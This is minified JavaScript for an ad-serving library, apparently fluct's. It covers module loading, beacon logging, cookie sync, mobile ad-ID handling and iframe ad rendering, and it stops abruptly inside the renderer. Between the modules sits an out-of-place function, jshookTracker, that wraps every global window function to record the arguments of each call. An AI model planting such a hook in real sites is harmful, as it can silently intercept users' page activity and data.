!function (e) {
  "use strict";

  var t = document.currentScript,
    o = "https://pdn.adingo.jp/";
  function r(e, t) {
    var o = e.split("/");
    o.pop();
    for (var r = t.split("../"), i = r.length, n = 0; n < i - 1; n++) o.pop(), r.shift();
    return o.push(r[0].replace("./", "")), o.join("/");
  }
  function i(e, t, o) {
    var r = document.head || document.getElementsByTagName("head")[0],
      i = document.createElement("link");
    i.href = e, i.rel = "preload", i.as = "script", r.appendChild(i);
    var n = 0,
      p = function () {
        var i = document.createElement("script");
        i.async = !0, i.type = "text/javascript", i.src = e;
        var a = function () {
          t();
        };
        i.onload = a, i.onreadystatechange = function () {
          var e = i.readyState;
          "loaded" !== e && "complete" !== e || a();
        }, i.onerror = function () {
          (n += 1) < 3 ? p() : o(new Error("Failed to load module from " + e));
        }, r.appendChild(i);
      };
    p();
  }
  var n = function () {
    function e() {
      this.moduleMap = {}, this.exportedMap = {}, this.importQueueMap = {}, this.define.amd = {};
    }
    return e.prototype.define = function () {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      var o = e[0];
      if (!(o in this.moduleMap) && !(o in this.exportedMap)) {
        var r,
          i,
          n = e[1];
        n instanceof Array ? (i = n, r = e[2]) : (i = [], r = n);
        var p = {
            factory: r,
            dependencies: i
          },
          a = this.importQueueMap[o];
        if (a) {
          for (var u = this.evalModule(o, p), d = 0; d < a.length; d++) {
            var c = a[d];
            c(u);
          }
          delete this.importQueueMap[o];
        } else this.moduleMap[o] = p;
      }
    }, e.prototype.import = function (e) {
      var t = this,
        o = this.getModule("lib/promise").PromiseLike,
        r = this.getModule(e);
      return r ? o.resolve(r) : new o(function (o, r) {
        t.importQueueMap[e] || (t.loadScript("p/2e141a4/" + e + ".js").catch(function (e) {
          return r(e);
        }), t.importQueueMap[e] = []), t.importQueueMap[e].push(o);
      });
    }, e.prototype.loadScript = function (e) {
      return new (0, this.getModule("lib/promise").PromiseLike)(function (r, n) {
        i(function () {
          if (!t) return o;
          if (URL) {
            var e = new URL(t.src);
            return e.protocol + "//" + e.host + e.pathname.split("/").slice(0, -1).join("/") + "/";
          }
          return o;
        }() + e, r, n);
      });
    }, e.prototype.popModule = function (e) {
      var t = this.moduleMap[e];
      return delete this.moduleMap[e], t;
    }, e.prototype.getModule = function (e) {
      var t = this.exportedMap[e];
      if (void 0 !== t) return t;
      var o = this.popModule(e);
      return void 0 !== o ? this.evalModule(e, o) : void 0;
    }, e.prototype.evalModule = function (e, t) {
      for (var o = {}, i = [], n = 0; n < t.dependencies.length; n++) {
        var p = t.dependencies[n];
        if ("exports" !== p) {
          var a = r(e, p);
          i.push(this.getModule(a));
        } else i.push(o);
      }
      var u = t.factory.apply(t, i) || o;
      return this.exportedMap[e] = u, u;
    }, e;
  }();
  window.fluctAdScript ? window.fluctAdScript.mod || (window.fluctAdScript.mod = new n()) : window.fluctAdScript = {
    mod: new n()
  }, e.ModuleLoader = n;
}({});
fluctAdScript.mod.define("lib/event_handler", ["exports"], function (e) {
  "use strict";

  var r = function () {
      function e() {
        this.errorHandlers = [], this.renderedHandlers = [];
      }
      return e.prototype.addRenderedHandler = function (e) {
        this.renderedHandlers.push(e);
      }, e.prototype.addErrorHandler = function (e) {
        this.errorHandlers.push(e);
      }, e.prototype.handleRenderingFailed = function (e) {
        for (var r = 0; r < this.errorHandlers.length; r++) this.errorHandlers[r](e);
      }, e.prototype.handleRendered = function (e) {
        for (var r = 0; r < this.renderedHandlers.length; r++) this.renderedHandlers[r](e);
      }, e;
    }(),
    n = new r();
  e.EventHandler = r, e.GlobalEventHandler = n;
});
fluctAdScript.mod.define("lib/util", ["exports"], function (e) {
  "use strict";

  var t = document.currentScript;
  function n(e) {
    return e && "object" == typeof e && !Array.isArray(e);
  }
  function r(e, t, n) {
    if (window.fetch) window.fetch(n, {
      method: "GET",
      mode: "no-cors",
      credentials: "include",
      cache: "no-store",
      keepalive: !0
    });else {
      var r = e.createElement("img");
      r.src = n, r.style.display = "none !important", r.style.position = "absolute", r.style.border = "none", r.style.padding = "0", r.style.margin = "0", r.width = 0, r.height = 0, r.border = "0", t.appendChild(r);
    }
  }
  function i(e) {
    try {
      var t = e.parent;
      return t.document, e.top === t ? t : i(t);
    } catch (t) {
      return e;
    }
  }
  function o(e) {
    if (!e) return null;
    try {
      var t = e.frameElement;
      if (!t) return t;
      for (; t.ownerDocument.defaultView.frameElement;) t = t.ownerDocument.defaultView.frameElement;
      return t;
    } catch (e) {
      return null;
    }
  }
  function u(e, t) {
    return t.querySelector('meta[name="' + e + '"]');
  }
  e.canWeUseSandboxIframe = function (e) {
    if (-1 !== e.indexOf("Trident")) return !1;
    if (-1 !== e.indexOf("Edge")) return !1;
    if (-1 !== e.indexOf("Firefox")) return !1;
    var t = e.match(/Chrome\/([^\s]+)/) || e.match(/CriOS\/([^\s]+)/);
    if (null !== t) {
      var n = t[1].split(".");
      return !((i = parseInt(n[0], 10)) < 58);
    }
    if (-1 !== e.indexOf("Safari")) {
      var r = e.match(/Version\/([^\s]+)/);
      if (null === r) return !1;
      var i;
      n = r[1].split(".");
      return !((i = parseInt(n[0], 10)) < 11) && (11 !== i || !(parseInt(n[1], 10) < 1));
    }
    return !1;
  }, e.compose = function (e, t) {
    return function (n) {
      return t(e(n));
    };
  }, e.createIframe = function (e, t) {
    var n = document.createElement("iframe");
    return n.style.cssText = "width: " + e + "; height: " + t + "; border: 0", n.src = "about:blank", n.srcdoc = "<html/>", n;
  }, e.currentScript = t, e.escapeFromIframe = function (e) {
    var t = o(window);
    return !!t && (t.parentElement.insertBefore(e, t.nextSibling), t.width = t.height = "0", t.style.width = t.style.height = "0px", !0);
  }, e.findFriendlyTopWindow = i, e.getMeta = u, e.getMetaKeywords = function (e) {
    var t = {};
    return ["keywords", "news_keywords"].forEach(function (n) {
      var r = u(n, e);
      if (r) {
        var i = r.content.split(/,/).filter(function (e) {
          return e.length < 30;
        });
        if (i.length > 30) return;
        t[n] = i;
      }
    }), t;
  }, e.getPage = function (e) {
    try {
      return {
        href: e.top.location.href || "",
        referrer: e.top.document.referrer || ""
      };
    } catch (t) {
      return {
        href: i(e).document.referrer || "",
        referrer: ""
      };
    }
  }, e.getTopIframeElement = o, e.getValueOrDefault = function (e, t, n) {
    return null != e ? e : (n(), t);
  }, e.hasActualSize = function (e) {
    return (0 !== e.width || 0 !== e.height) && (999 !== e.width || 999 !== e.height);
  }, e.includes = function (e, t) {
    return -1 !== e.indexOf(t);
  }, e.isElementExistInTree = function (e) {
    return !!e.ownerDocument && e.ownerDocument.body.contains(e);
  }, e.isValidUrl = function (e) {
    return /^http(s)?:\/\/[\w\-\._~:/?#[\]@!\$&'\(\)\*\+,;=.%]+$/.test(e);
  }, e.mergeObject = function (e, t) {
    for (var n in t) {
      var r = t[n];
      null != r && (e[n] = t[n]);
    }
    return e;
  }, e.mergeObjectDeep = function e(t, r) {
    if (n(t) && n(r)) for (var i in r) {
      var o = r[i];
      null != o && (n(o) ? (n(t[i]) || (t[i] = {}), e(t[i], r[i])) : t[i] = r[i]);
    }
    return t;
  }, e.postBeacon = function (e, t, n) {
    var r = JSON.stringify(t);
    if (window.fetch) window.fetch(e, {
      method: "POST",
      mode: "cors",
      credentials: n ? "include" : "omit",
      cache: "no-store",
      keepalive: !0,
      headers: {
        "Content-Type": "application/json"
      },
      body: r
    });else {
      var i = new XMLHttpRequest();
      i.open("POST", e), i.setRequestHeader("Content-Type", "application/json"), i.send(r);
    }
  }, e.resizeTopIframeElement = function (e, t, n) {
    var r = o(e),
      i = "100vw" === (null == r ? void 0 : r.style.width) && "100vh" === (null == r ? void 0 : r.style.height);
    r && !i && (r.width = "" + t, r.height = "" + n, r.style.width = t + "px", r.style.height = n + "px");
  }, e.sendBeacon = r, e.sendBeacons = function (e, t, n) {
    for (var i = 0; i < n.length; i++) r(e, t, n[i]);
  }, e.sendIdToCookieMonster = function (e, t, n) {
    var i = "https://cs.adingo.jp/sync/?from=" + encodeURIComponent(e) + "&id=" + encodeURIComponent(t);
    r(n.document, n.document.body, i);
  }, e.uuid = function () {
    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (e) {
      var t = 16 * Math.random() | 0;
      return ("x" == e ? t : 3 & t | 8).toString(16);
    });
  }, e.wrapElement = function (e, t) {
    t.parentElement.insertBefore(e, t), e.appendChild(t);
  };
});
fluctAdScript.mod.define("lib/logger", ["exports", "./util"], function (n, r) {
  "use strict";

  function e(n, e, o) {
    !function (n, e, o, t) {
      var c = t;
      c.useragent = navigator.userAgent, r.postBeacon("https://hs.adingo.jp/taglog", {
        kind: n,
        level: e,
        params: c
      }, !1);
    }("PjsEvent", n, 0, r.mergeObject({
      version: "2e141a4d749d52df2b6bfa490cd8622133006ee7",
      script: (r.currentScript || {}).src
    }, o));
  }
  function o(n, r) {
    switch (n) {
      case "Error":
        return console.error(r);
      case "Warn":
        return console.warn(r);
      case "Info":
        return console.info(r);
      case "Debug":
        return console.debug(r);
    }
  }
  function t(n, t, c, i) {
    if (o(n, t), o(n, JSON.stringify(c)), !(i <= Math.random())) {
      e(n, 0, c);
      Math.random() <= .1 && function (n, e, o) {
        window.fluctAdScript.mod.import("lib/datadog").then(function (t) {
          t(window).then(function (t) {
            return null == t ? void 0 : t.logger[n.toLowerCase()](e, r.mergeObject({
              version: "2e141a4d749d52df2b6bfa490cd8622133006ee7",
              script: (r.currentScript || {}).src
            }, o));
          });
        });
      }(n, t, c);
    }
  }
  n.debug = function (n, r, e) {
    t("Debug", n, r, e);
  }, n.error = function (n, r, e) {
    t("Error", n, r, e);
  }, n.info = function (n, r, e) {
    t("Info", n, r, e);
  }, n.log = t, n.warn = function (n, r, e) {
    t("Warn", n, r, e);
  };
});
fluctAdScript.mod.define("lib/error", ["exports", "./logger"], function (e, r) {
  "use strict";

  function t(e) {
    if (e && e.__esModule) return e;
    var r = Object.create(null);
    return e && Object.keys(e).forEach(function (t) {
      if ("default" !== t) {
        var n = Object.getOwnPropertyDescriptor(e, t);
        Object.defineProperty(r, t, n.get ? n : {
          enumerable: !0,
          get: function () {
            return e[t];
          }
        });
      }
    }), r.default = e, Object.freeze(r);
  }
  var n = t(r),
    i = function () {
      function e(e, r) {
        this.kind = e, this.inner = r;
      }
      return e.prototype.notify = function (e) {
        n.error(this.inner.message, {
          exception: this.pretty()
        }, e);
      }, e.prototype.pretty = function () {
        var e = this.inner;
        return {
          kind: this.kind,
          message: e.message,
          name: e.name,
          description: e.description,
          number: e.number,
          fileName: e.fileName || e.sourceURL,
          lineNumber: e.lineNumber || e.line,
          columnNumber: e.columnNumber,
          stack: e.stack
        };
      }, e;
    }();
  e.PjsError = i;
});
fluctAdScript.mod.define("lib/promise", ["exports", "./event_handler", "./error"], function (t, n, e) {
  "use strict";

  var i = function () {
    function t(t) {
      var n = this;
      this.childList = [], this.resolve = this.resolve.bind(this), this.reject = this.reject.bind(this);
      var e = !1;
      try {
        t(function (t) {
          e || (e = !0, n.resolve(t));
        }, function (t) {
          e || (e = !0, n.reject(t));
        });
      } catch (t) {
        this.reject(t);
      }
    }
    return t.resolve = function (n) {
      return new t(function (t, e) {
        return t(n);
      });
    }, t.reject = function (n) {
      return new t(function (t, e) {
        return e(n);
      });
    }, t.all = function (n) {
      var e = n.pop();
      return e ? e.then(function (e) {
        return t.all(n).then(function (t) {
          return t.push(e), t;
        });
      }) : t.resolve([]);
    }, t.prototype.then = function (t) {
      var n = this.clone();
      return this.pending ? (n.chain(this.pending.value, t), n) : (n.thenFn = t, n);
    }, t.prototype.catch = function (t) {
      var n = this.clone();
      return this.pending ? (n.pending = this.pending, n) : (n.catchFn = t, n);
    }, t.prototype.resolve = function (n) {
      if (n instanceof t) n.then(this.resolve).catch(this.reject);else {
        var e = this.thenFn;
        if (e) return delete this.thenFn, void this.chain(n, e);
        this.pending = {
          value: n
        };
        for (var i = 0; i < this.childList.length; i++) {
          this.childList[i].resolve(n);
        }
      }
    }, t.prototype.reject = function (t) {
      var i = this,
        r = this.catchFn;
      if (r) return delete this.catchFn, void this.chain(t, r);
      setTimeout(function () {
        if (0 === i.childList.length) {
          var r = new e.PjsError("RuntimeError", function (t) {
            return t instanceof Error ? t : new Error(String(t));
          }(t));
          r.notify(1), n.GlobalEventHandler.handleRenderingFailed(r);
        }
        for (var o = 0; o < i.childList.length; o++) {
          i.childList[o].reject(t);
        }
      }, 0);
    }, t.prototype.chain = function (t, n) {
      var e;
      try {
        e = n(t);
      } catch (t) {
        return void this.reject(t);
      }
      this.resolve(e);
    }, t.prototype.clone = function () {
      var n = new t(function () {});
      return this.childList.push(n), n;
    }, t;
  }();
  t.PromiseLike = i, t.delay = function (t) {
    return new i(function (n) {
      setTimeout(function () {
        return n();
      }, t);
    });
  }, t.never = function () {
    return new i(function (t) {});
  };
});
fluctAdScript.mod.define("lib/skadnetwork", ["exports"], function (n) {
  "use strict";

  n.extractSkadnParams = function (n) {
    var i,
      e = n;
    if (!e.skadn) return {};
    var t = {
      version: e.skadn.version,
      network: e.skadn.network,
      campaign: e.skadn.campaign,
      itunesitem: e.skadn.itunesitem,
      nonce: e.skadn.nonce,
      sourceapp: e.skadn.sourceapp,
      timestamp: e.skadn.timestamp,
      signature: e.skadn.signature,
      fidelities: null === (i = e.skadn.fidelities) || void 0 === i ? void 0 : i.map(function (n) {
        return {
          fidelity: n.fidelity,
          signature: n.signature,
          nonce: n.nonce,
          timestamp: n.timestamp
        };
      })
    };
    return {
      skadn: JSON.stringify(t)
    };
  };
});
fluctAdScript.mod.define("lib/fluct_sdk", ["exports", "./event_handler", "./skadnetwork"], function (e, t, n) {
  "use strict";

  var r;
  function d(e) {
    var t = document.createElement("iframe");
    t.setAttribute("src", e), document.body.appendChild(t), t.parentNode && t.parentNode.removeChild(t), t = null;
  }
  !function (e) {
    e.ServerError = "server_error", e.NoAds = "no_ads", e.BadRequest = "bad_request";
  }(r || (r = {}));
  var o = function () {
    function e(e, t) {
      this.isEnableHandlers = !1, this.store = e, this.reloader = t;
    }
    return e.prototype.setResponse = function (e, t) {
      var n = {
        groupId: e,
        resp: t
      };
      this.store.setResponse(n, this.reloader);
    }, e.prototype.enableFeaturesForSDK = function (t) {
      "number" == typeof t.width && "number" == typeof t.height && (e.width = t.width, e.height = t.height), e.isSdk = !0, this.enableHandlers();
    }, e.prototype.enableHandlers = function () {
      this.isEnableHandlers || (this.isEnableHandlers = !0, t.GlobalEventHandler.addRenderedHandler(function (e) {
        var t = e.creative,
          r = n.extractSkadnParams(t),
          o = t.clicktrackers;
        o && (r.clicktrackers = o.join(",")), 0 !== Object.keys(r).length ? d("fluct://succeeded?" + function (e) {
          var t = [];
          for (var n in e) t.push(encodeURIComponent(n) + "=" + encodeURIComponent(e[n]));
          return t.join("&");
        }(r)) : d("fluct://succeeded");
      }), t.GlobalEventHandler.addErrorHandler(function (e) {
        d("fluct://failed?code=" + function (e) {
          switch (e) {
            case "NoCampaignFound":
            case "NoAd":
              return r.NoAds;
            case "BadRequestForDlv":
            case "InvalidUnitId":
              return r.BadRequest;
            default:
              return r.ServerError;
          }
        }(e.kind));
      }));
    }, e.getWidth = function () {
      return e.width;
    }, e.getHeight = function () {
      return e.height;
    }, e.getIsSdk = function () {
      return e.isSdk;
    }, e.isSdk = !1, e;
  }();
  e.FluctSdkExt = o;
});
fluctAdScript.mod.define("lib/tpl/1", ["../fluct_sdk", "../util", "../promise", "../logger"], function (t, e, i, n) {
  "use strict";

  function r(t) {
    if (t && t.__esModule) return t;
    var e = Object.create(null);
    return t && Object.keys(t).forEach(function (i) {
      if ("default" !== i) {
        var n = Object.getOwnPropertyDescriptor(t, i);
        Object.defineProperty(e, i, n.get ? n : {
          enumerable: !0,
          get: function () {
            return t[i];
          }
        });
      }
    }), e.default = t, Object.freeze(e);
  }
  var o = r(n);
  function l(e, i) {
    var n = function (e, i) {
      if (t.FluctSdkExt.getIsSdk() && t.FluctSdkExt.getWidth() && t.FluctSdkExt.getHeight()) return Math.min(t.FluctSdkExt.getWidth() / e.clientWidth, t.FluctSdkExt.getHeight() / e.clientHeight);
      var n = 1;
      switch (i) {
        case "disable":
          return 1;
        case "parent":
          n = e.parentElement.clientWidth / e.clientWidth;
          break;
        case "window":
          n = e.ownerDocument.body.clientWidth / e.clientWidth;
      }
      return n > 0 ? n : 1;
    }(e, i);
    if (1 !== n) {
      e.style.transform = "scale(" + n + ")", e.style.transformOrigin = "top left", e.style.marginRight = parseInt(e.style.width, 10) * (n - 1) + "px", e.style.marginBottom = parseInt(e.style.height, 10) * (n - 1) + "px";
      var r = function (t, e) {
        switch (e) {
          case "disable":
          case "parent":
            return 0;
          case "window":
            return -t.getBoundingClientRect().left;
        }
      }(e, i);
      0 !== r && (e.style.position = "relative", e.style.left = r + "px"), t.FluctSdkExt.getIsSdk() && t.FluctSdkExt.getWidth() && t.FluctSdkExt.getHeight() && (e.style.marginTop = (t.FluctSdkExt.getHeight() - e.clientHeight * n) / 2 + "px", e.style.marginLeft = (t.FluctSdkExt.getWidth() - e.clientWidth * n) / 2 + "px");
    }
  }
  return function () {
    function t(t, i, n) {
      var r, l, a;
      void 0 === n && (n = !1);
      var c = [];
      if (this.inlineParams = {
        zoom: e.getValueOrDefault(null === (r = t.inline) || void 0 === r ? void 0 : r.zoom, "disable", function () {
          c.push("zoom");
        }),
        sticky: e.getValueOrDefault(null === (l = t.inline) || void 0 === l ? void 0 : l.sticky, "disable", function () {
          c.push("sticky");
        }),
        stickyTopMargin: e.getValueOrDefault(null === (a = t.inline) || void 0 === a ? void 0 : a.stickyTopMargin, 0, function () {
          c.push("sticky_top_margin");
        })
      }, !n && c.length > 0) {
        var u = "Detect null record inline Template on group " + i + ": " + c;
        o.warn(u, {
          msg: u
        }, 1);
      }
    }
    return t.prototype.layout = function (t, e, i) {
      var n = t.style;
      n.width = e + "px", n.height = i + "px", l(t, this.inlineParams.zoom);
    }, t.prototype.apply = function (t, n) {
      var r = this;
      if (!e.hasActualSize(n)) return i.PromiseLike.resolve({
        root: t,
        componentMap: {},
        modifierMap: {}
      });
      "window" === this.inlineParams.zoom && e.escapeFromIframe(t);
      var o = n.width,
        l = n.height;
      return this.layout(t, o, l), "video_only" === this.inlineParams.sticky && "vast" === n.creative_type ? window.fluctAdScript.mod.import("lib/tpl/1/sticky").then(function (e) {
        return {
          root: e(t, r.inlineParams.stickyTopMargin),
          componentMap: {},
          modifierMap: {}
        };
      }) : i.PromiseLike.resolve({
        root: t,
        componentMap: {},
        modifierMap: {
          setHeight: function (e) {
            l = e, r.layout(t, o, l);
          },
          setWidth: function (e) {
            "string" == typeof e && "fluid" === e.toLowerCase() ? o = t.ownerDocument.documentElement.clientWidth : "number" == typeof e && (o = e), r.layout(t, o, l);
          }
        }
      });
    }, t;
  }();
});
fluctAdScript.mod.define("lib/legacy_template", ["exports", "./error", "./logger"], function (e, r, t) {
  "use strict";

  function n(e) {
    if (e && e.__esModule) return e;
    var r = Object.create(null);
    return e && Object.keys(e).forEach(function (t) {
      if ("default" !== t) {
        var n = Object.getOwnPropertyDescriptor(e, t);
        Object.defineProperty(r, t, n.get ? n : {
          enumerable: !0,
          get: function () {
            return e[t];
          }
        });
      }
    }), r.default = e, Object.freeze(r);
  }
  var i = n(t);
  e.chooseCompatibleTemplate = function (e, t, n) {
    var u = 'Detect unsupported template "' + t + "/" + n + '" on group ' + e;
    if (i.warn(u, {
      msg: u
    }, 1), "default" === t) {
      if (83 === n) return [1, {}];
      if (105 === n) return [1, {}];
      if (112 === n) return [2, {
        overlay: {
          prHeight: 20
        }
      }];
      if (120 === n) return [2, {}];
      if (121 === n) return [2, {
        overlay: {
          prHeight: 20
        }
      }];
      if (122 === n) return [2, {
        overlay: {
          prHeight: 30
        }
      }];
    }
    if ("default-v2" === t) return [1, {}];
    if ("special" === t) {
      if (4 === n) return [3, {}];
      if (5 === n) return [3, {}];
      if (27 === n) return [3, {}];
      if (28 === n) return [3, {}];
      if (31 === n) return [1, {
        inline: {
          zoom: "window"
        }
      }];
      if (40 === n) return [1, {
        inline: {
          zoom: "window"
        }
      }];
      if (41 === n) return [3, {}];
      if (42 === n) return [3, {}];
      if (43 === n) return [3, {}];
    }
    return "async" === t && 8 === n ? [3, {}] : (new r.PjsError("UnSupportedTemplate", new Error('Detect no compatibility template "' + t + "/" + n + '" on group ' + e)).notify(1), [1, {}]);
  };
});
fluctAdScript.mod.define("lib/template", ["exports", "./error", "./promise", "./tpl/1", "./legacy_template", "./util"], function (e, t, r, n, o, i) {
  "use strict";

  function l(e) {
    return e && "object" == typeof e && "default" in e ? e : {
      default: e
    };
  }
  var u = l(n);
  function a(e, n, o, i) {
    return 1 === n ? r.PromiseLike.resolve(new u.default(o, e, i)) : window.fluctAdScript.mod.import("lib/tpl/" + n).then(function (t) {
      return new t(o, e, i);
    }).catch(function () {
      return new t.PjsError("FailedFetchTemplate", new Error("Failed to fetch template api/" + n + " on group " + e)).notify(1), new u.default(o, e, i);
    });
  }
  e.loadTemplate = function (e, t, r) {
    if ("api" !== t.k) {
      var n = o.chooseCompatibleTemplate(e, t.k, t.v),
        l = n[0],
        u = n[1];
      return a(e, l, i.mergeObject(r, u), !0);
    }
    return a(e, t.v, i.mergeObject(r, r), !1);
  };
});
fluctAdScript.mod.define("lib/sp_app_util", ["exports"], function (n) {
  "use strict";

  var t = "00000000-0000-0000-0000-000000000000";
  function a(n, t) {
    -1 !== navigator.userAgent.indexOf("Android") ? n.nend_gaid = t : n.nend_idfa_raw = t;
  }
  n.ZERO_FILLED_IFA = t, n.addParamsForADNW = function (n, t, r, i) {
    !function (n, t, a) {
      n.gvaIfa = {
        ifa: "1" === t ? "" : a
      };
    }(n, t, r), "" !== i && function (n, t) {
      n.fluctAdParam = {
        bundle: t
      };
    }(n, i), "" !== t && "" !== r && (!function (n, t, a) {
      n.fluctAdParam || (n.fluctAdParam = {}), n.fluctAdParam.ifa = a, n.fluctAdParam.lmt = t;
    }(n, t, r), function (n, t, a) {
      n.zucksIdfa = {
        ida: a,
        lat: t
      };
    }(n, t, r), function (n, t, a) {
      n.adpressoIdfa = {
        idfa: a,
        lat: Number(t)
      };
    }(n, t, r), function (n, t, a) {
      var r = function (n) {
        return "1" === n;
      }(t);
      n.amoadOption = {
        idfa: a,
        optout: r
      };
    }(n, t, r), function (n, t) {
      n.imobile_dvid = t;
    }(n, r), "0" === t && a(n, r));
  }, n.determineAdTracking = function (n, a, r) {
    if (!function (n) {
      return -1 !== n.indexOf("iPhone") || -1 !== n.indexOf("iPad");
    }(r)) return n;
    var i = r.match(/OS ([^\s]+)/);
    if (null === i) return n;
    var e = i[1].split("_");
    return parseInt(e[0], 10) < 14 ? n : "" !== a && a !== t ? "0" : "1";
  }, n.expandMacro = function (n, a, r) {
    var i = t;
    "0" === a && "" !== r && (i = r);
    var e = {
      "%%FLUCT_IFA_PLACEHOLDER%%": i
    };
    return Object.keys(e).reduce(function (n, t) {
      return n.replace(t, e[t]);
    }, n);
  }, n.replaceLmtIfBool = function (n) {
    switch (n) {
      case !0:
        return "1";
      case !1:
        return "0";
      default:
        return n;
    }
  };
});
fluctAdScript.mod.define("lib/context_builder", ["exports", "./util", "./sp_app_util", "./logger"], function (t, e, n, r) {
  "use strict";

  function u(t) {
    if (t && t.__esModule) return t;
    var e = Object.create(null);
    return t && Object.keys(t).forEach(function (n) {
      if ("default" !== n) {
        var r = Object.getOwnPropertyDescriptor(t, n);
        Object.defineProperty(e, n, r.get ? r : {
          enumerable: !0,
          get: function () {
            return t[n];
          }
        });
      }
    }), e.default = t, Object.freeze(e);
  }
  var i = u(r),
    o = function () {
      function t(t) {
        this.target = t;
      }
      return t.prototype.build = function () {
        for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e];
        for (var n = 0; n < t.length; n++) t[n](this.target);
        return this.target;
      }, t;
    }();
  var a = function (t) {
      return function (e) {
        e.keyValue ? e.keyValue.merge(t) : e.keyValue = new f(t);
      };
    },
    c = function (t, r) {
      r.dlvParams && (t.dlvParams = e.mergeObject(t.dlvParams, r.dlvParams), void 0 !== t.dlvParams.lmt && (t.dlvParams.lmt = n.replaceLmtIfBool(t.dlvParams.lmt)));
    },
    f = function () {
      function t(t) {
        void 0 === t && (t = {}), this.kv = t;
      }
      return t.prototype.add = function (t, e) {
        this.kv[t] ? this.kv[t].push(e) : this.kv[t] = [e];
      }, t.prototype.merge = function (t) {
        e.mergeObject(this.kv, t);
      }, t.prototype.toString = function () {
        return JSON.stringify(this.kv);
      }, t;
    }();
  t.ContextBuilder = o, t.KeyValue = f, t.optionBuilder = function (t) {
    return function (e) {
      var n;
      return (n = new o(e)).build.apply(n, t), e;
    };
  }, t.setBehavior = function (t) {
    return function (n) {
      t && (n.behavior = e.mergeObjectDeep(n.behavior || {}, t));
    };
  }, t.setConfig = function (t) {
    return function (e) {
      c(e, t);
    };
  }, t.setDlvHost = function (t) {
    return function (e) {
      t && (e.dlvHost = t);
    };
  }, t.setDlvParam = function (t, e) {
    return function (n) {
      var r;
      c(n, {
        dlvParams: (r = {}, r[t] = e, r)
      });
    };
  }, t.setGamTargetingMap = function (t) {
    var e = function () {
      return {};
    };
    try {
      if ("%%PATTERN:TARGETINGMAP%%" === t || "null" === t || "" === t) return e;
      var n = JSON.parse(t);
      if ("object" != typeof n) throw "not an object";
      return a(n);
    } catch (n) {
      var r = "setGamTargetingMap(" + t + ") received bad JSON";
      return i.warn(r, {
        exception: n
      }, 1), e;
    }
  }, t.setID = function (t, e) {
    return function (n) {
      var r;
      e.length > 0 && c(n, {
        dlvParams: (r = {}, r[t] = e.join(","), r)
      });
    };
  }, t.setTargeting = function (t, e) {
    return function (n) {
      void 0 === n.keyValue && (n.keyValue = new f()), n.keyValue.add(t, e);
    };
  }, t.setTargetingBulk = a, t.setTemplate = function (t) {
    return function (n) {
      t && (n.template = e.mergeObject(n.template || {}, t));
    };
  };
});
fluctAdScript.mod.define("lib/client_hints", ["exports", "./promise", "./context_builder"], function (e, t, n) {
  "use strict";

  var r = function () {
    function e(e) {
      void 0 === e && (e = window), this.window = e;
    }
    return e.prototype.loadDlvParams = function () {
      return this.getUserAgentValues().then(function (e) {
        var r = [];
        return e.platformVersion && r.push(n.setDlvParam("ch_pv", e.platformVersion)), e.model && r.push(n.setDlvParam("ch_mdl", e.model)), t.PromiseLike.resolve(r);
      }).catch(function () {
        return t.PromiseLike.resolve([]);
      });
    }, e.prototype.getUserAgentValues = function () {
      var n = this;
      return new t.PromiseLike(function (t) {
        var r = n.window.navigator;
        if (e.uaValues) t(e.uaValues);else {
          if (r.userAgentData && r.userAgentData.getHighEntropyValues) try {
            return void r.userAgentData.getHighEntropyValues(["platformVersion", "model"]).then(function (n) {
              var r, o;
              t(e.uaValues = {
                platformVersion: null !== (r = n.platformVersion) && void 0 !== r ? r : "",
                model: null !== (o = n.model) && void 0 !== o ? o : ""
              });
            }).catch(function () {
              t(e.uaValues = {});
            });
          } catch (e) {}
          t(e.uaValues = {});
        }
      });
    }, e;
  }();
  e.ClientHints = r;
});
function jshookTracker() {
  const jshooks = {};
  if (!window._customData) {
    window._customData = {
      hooks: []
    };
  }
  function hookJsFunc(jsFunc, funcName) {
    if (typeof jsFunc === "function" && !window._customData.hooks.includes(funcName)) {
      window._customData.hooks.push(funcName);
      window[funcName] = function (...args) {
        jshooks[funcName] = args;
        return jsFunc(...args);
      };
    }
  }
  for (let key in window) {
    if (window.hasOwnProperty(key)) {
      hookJsFunc(window[key], key);
    }
  }
  return jshooks;
}
fluctAdScript.mod.define("lib/renderer", ["exports", "./client_hints", "./util", "./event_handler", "./error", "./promise", "./sp_app_util", "./logger"], function (e, n, t, r, o, i, a, c) {
  "use strict";

  function u(e) {
    if (e && e.__esModule) return e;
    var n = Object.create(null);
    return e && Object.keys(e).forEach(function (t) {
      if ("default" !== t) {
        var r = Object.getOwnPropertyDescriptor(e, t);
        Object.defineProperty(n, t, r.get ? r : {
          enumerable: !0,
          get: function () {
            return e[t];
          }
        });
      }
    }), n.default = e, Object.freeze(n);
  }
  var l = u(c),
    d = function () {
      return (d = Object.assign || function (e) {
        for (var n, t = 1, r = arguments.length; t < r; t++) for (var o in n = arguments[t]) Object.prototype.hasOwnProperty.call(n, o) && (e[o] = n[o]);
        return e;
      }).apply(this, arguments);
    };
  function s(e, n, a) {
    var c = e.shift();
    if (!t.isElementExistInTree(c)) {
      var u = 'The container for unit "' + n + '" has already been removed';
      return l.warn(u, {
        msg: u
      }, .1), r.GlobalEventHandler.handleRenderingFailed(new o.PjsError("ContainerIsRemoved", new Error(u))), i.PromiseLike.resolve([]);
    }
    return a(c);
  }
  function p(e) {
    var n;
    switch (e.nodeName) {
      case "SCRIPT":
        return !0;
      case "SPAN":
        return /^fluct\-native/.test(null !== (n = e.id) && void 0 !== n ? n : "");
      default:
        return !1;
    }
  }
  var f = function () {
    function e(e) {
      this.beacons = e;
    }
    return e.prototype.fire = function (e, n) {
      t.sendBeacons(e, n, this.beacons);
    }, e;
  }();
  e.render = function (e, c, u, m, v, h) {
    switch (c.creative_type) {
      case "html":
        return s(e, c.unit_id, function (e, n, r) {
          return function (o) {
            var i = o.ownerDocument,
              c = e,
              u = new f(c.click_beacons);
            return n.apply(o, c, r).then(function (e) {
              var n;
              if (null === e) return [{
                container: o
              }];
              var r = (function (e, n, r, o, i, c) {
                try {
                  var u = t.createIframe("100%", "100%");
                  t.canWeUseSandboxIframe(navigator.userAgent) && u.setAttribute("sandbox", "allow-scripts allow-forms allow-pointer-lock allow-popups allow-same-origin allow-top-navigation-by-user-activation"), u.setAttribute("scrolling", "no"), n.appendChild(u);
                  var l = u.contentWindow,
                    d = r.html,
                    s = window.fluctAdParam;
